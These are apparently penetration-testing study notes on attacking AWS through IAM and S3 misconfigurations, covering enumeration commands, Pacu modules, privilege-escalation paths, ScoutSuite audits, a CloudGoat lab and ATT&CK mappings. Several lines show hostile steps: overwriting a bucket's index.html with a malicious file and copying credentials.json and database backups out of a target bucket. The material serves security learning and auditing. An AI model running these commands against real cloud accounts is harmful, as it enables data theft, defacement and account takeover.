# Cloud Attack Notes — AWS IAM & S3 Misconfigurations

## Key AWS Attack Techniques

### S3 Bucket Enumeration
```bash
# awscli — list all accessible buckets
aws s3 ls

# Check bucket ACL
aws s3api get-bucket-acl --bucket TARGET-BUCKET

# Download bucket contents
aws s3 sync s3://TARGET-BUCKET ./local-copy/

# Pacu module
run s3__bucket_finder
run s3__download_bucket --bucket TARGET-BUCKET
```

### IAM Enumeration
```bash
# Who am I?
aws sts get-caller-identity

# What can I do?
aws iam list-attached-user-policies --user-name USERNAME
aws iam get-policy-version --policy-arn ARN --version-id v1
aws iam simulate-principal-policy --policy-source-arn ARN --action-names '*'

# Pacu — automated IAM audit
run iam__enum_permissions
run iam__privesc_scan
```

### IAM Privilege Escalation Paths

| Path | Required Permissions | Method |
|------|---------------------|--------|
| Lambda PassRole | iam:PassRole + lambda:CreateFunction | Create Lambda with admin role |
| EC2 PassRole | iam:PassRole + ec2:RunInstances | Launch EC2 with admin instance profile |
| CloudFormation | iam:PassRole + cloudformation:CreateStack | Deploy stack with admin role |
| Glue | iam:PassRole + glue:CreateDevEndpoint | Create dev endpoint with admin role |

### S3 Privilege Escalation
```bash
# If public write access exists — plant malicious files
aws s3 cp malicious.html s3://TARGET-BUCKET/index.html

# Read sensitive files
aws s3 cp s3://TARGET-BUCKET/credentials.json .
aws s3 cp s3://TARGET-BUCKET/db_backup.sql.gz .
```

---

## ScoutSuite AWS Audit
```bash
# Install ScoutSuite
pip3 install scoutsuite

# Run full AWS audit
scout aws --profile dev-user --report-dir ./scoutsuite-report

# Open report
firefox ./scoutsuite-report/scoutsuite-report.html
```

---

## CloudGoat Lab Setup
```bash
# Install CloudGoat
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat && pip3 install -r requirements.txt

# Deploy vulnerable scenario
./cloudgoat.py create iam_privesc_by_attachment

# Follow scenario instructions
# Clean up when done
./cloudgoat.py destroy iam_privesc_by_attachment
```

---

## MITRE ATT&CK Cloud Techniques

| ID | Name | Example |
|----|------|---------|
| T1580 | Cloud Infrastructure Discovery | Pacu s3__bucket_finder |
| T1078.004 | Valid Accounts: Cloud Accounts | Stolen IAM keys |
| T1537 | Transfer Data to Cloud Account | S3 exfiltration |
| T1530 | Data from Cloud Storage Object | S3 read access |
| T1552.005 | Cloud Instance Metadata API | IMDSv1 SSRF |
| T1098.001 | Additional Cloud Credentials | IAM key creation |
